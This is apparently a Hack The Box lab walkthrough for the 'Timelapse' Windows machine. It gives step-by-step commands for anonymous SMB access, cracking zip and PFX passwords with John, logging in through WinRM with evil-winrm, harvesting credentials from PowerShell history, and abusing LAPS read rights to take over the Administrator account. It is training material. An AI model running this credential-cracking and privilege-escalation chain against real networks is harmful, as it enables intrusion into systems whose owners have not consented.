@@ -1,0 +1,142 @@
+                      Timelapse
+
+                                                                                  19th August 2022 / Document No
+                                                                            D22.100.194
+
+                                                                                  Prepared By: woodenk
+                                                                                  Machine Author(s): d4rkpayl0ad
+
+                                                                                  Difficulty: Easy
+                                                                                  Classification: Official
+
+                                 Synopsis
+
+                                                                            Timelapse is an Easy Windows which
+involves accessing a publicly accessible SMB share containing a zip file with a PFX key. This zip file
+requires a password, which can be cracked by using John. Extracting the zip file shows it contains
+a password encrypted PFX file which can be gathered with John as well by converting the PFX file
+to a hash format readable by John. From the PFX file an SSL certificate and a private key can be
+extracted which is used for logging in with WinRM. After authentication we discover a PowerShell
+history file containing login credentials for svc_deploy user. User enumeration shows that
+svc_deploy is part of a group named LAPS_Readers . The LAPS_Readers group has the ability to
+manage passwords in LAPS, which allows any user from this group to read the local passwords for
+machines in the domain so by abusing this trust we retrieve the password for Administrator and
+gain a WinRM session.
+
+Skills Required
+
+      Enumeration
+      Password cracking
+      Basic understanding of Windows
+
+Skills Learned
+
+      Public SMB Share
+      LAPS Privilege Escalation
+
+Enumeration
+Nmap
+
+Let's begin by scanning for open ports using Nmap .
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -
+   f 1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.166
+
+The output of Nmap shows multiple open ports, a machine name of dc01 and a domain name of
+timelapse.htb . We notice that SMB is open so we verify if we can get anonymous access to any
+shares.
+PFX file
+
+To view the available SMB shares we use the following command.
+   smbclient -L //10.10.11.152/
+
+The output above shows that there is a share with the name Shares , which we can access
+without the use of any credentials.
+
+   smbclient //10.10.11.152/Shares
+
+We find two folders named Dev and HelpDesk . In the Dev folder we find a zip file named
+winrm_backup.zip . Trying to unzip the file requires a password which we don't have at this
+moment. We attempt to crack the password with hash cracking tool John , but first we utilize the
+zip2john utility to convert the zip into a hash format.
+
+   zip2john winrm_backup.zip > zip.john
+   john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
+The output is a PFX file which contains an SSL certificate in PKCS#12 format and a private key. PFX
+files can be used by WinRM in order to login without a password. Let's extract them from the file.
+
+   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+
+The output above shows that we need a different password than supremelegacy . Utilizing the
+pfx2john utility we convert the pfx file into a hash format then use John to crack the
+password. Using the following command we are able to successfully crack the password to the
+pfx file.
+
+   python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
+   john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
+
+NOTE: For people that use Python3, that we remove b' and ' from the output of the Python script to
+ensure that John properly reads the hash. 
+
+Once the password is cracked we extract the SSL certificate and private key from the pfx file
+using the following commands.
+
+   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+   openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+
+Exploitation
+
+Foothold
+Since we have decrypted the pfx file and generated a valid key and certificate, we can attempt to
+login through WinRM. In the output of our Nmap command we can see that port 5986 is open,
+which is commonly used by WinRM but using SSL instead of unencrypted connections. Since
+Evil-WinRM allows us to pass a key and certificate using the -c and -k flags we can pass the
+certificate and key and authenticate to the target.
+Once logged in we perform some manual enumeration to see if we can escalate our privileges by
+checking the commandline history. Doing so shows us new login credentials.
+
+   evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
+   whoami
+   type
+   $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+Using the new credentials we are able to login through Evil-WinRM using the following command.
+   evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+
+Upon logging in we can check what groups the svc_deploy is a member of.
+   net user svc_deploy
+
+Privilege Escalation
+
+The output of the previous command shows that we are part of the LAPS_Readers group. The
+"Local Administrator Password Solution" (LAPS) is used to manage local account passwords of
+Active Directory computers. There is a PowerShell module that can be used to retrieve this
+password which can be found on github named AdmPwd.PS. It can be uploaded with Evil-WinRM
+using the following command.
+   upload AdmPwd.PS
+
+After uploading the module we can check what objects can manage the LAPS by using the
+following command.
+
+   Find-AdmPwdExtendedRights -identity *
+
+From the output we can see Domain Controllers. Let's look at the right holders to see if we are
+able to manage the password. We do this by using the following command.
+
+   Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object
+   ExtendedRightHolders
+
+The output of the previous command shows that the LAPS_Readers group has delegation over
+Domain Controllers which allows us to read the password for users in this object. We retrieve
+the password by using the following command.
+
+   get-admpwdpassword -computername dc01 | Select password
+
+W
+We try to authenticate through Evil-WinRM with the new credentials using the following
+command.
+
+   evil-winrm -i 10.10.11.152 -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S
+
+We got a shell as administrator and can read the root flag.
+
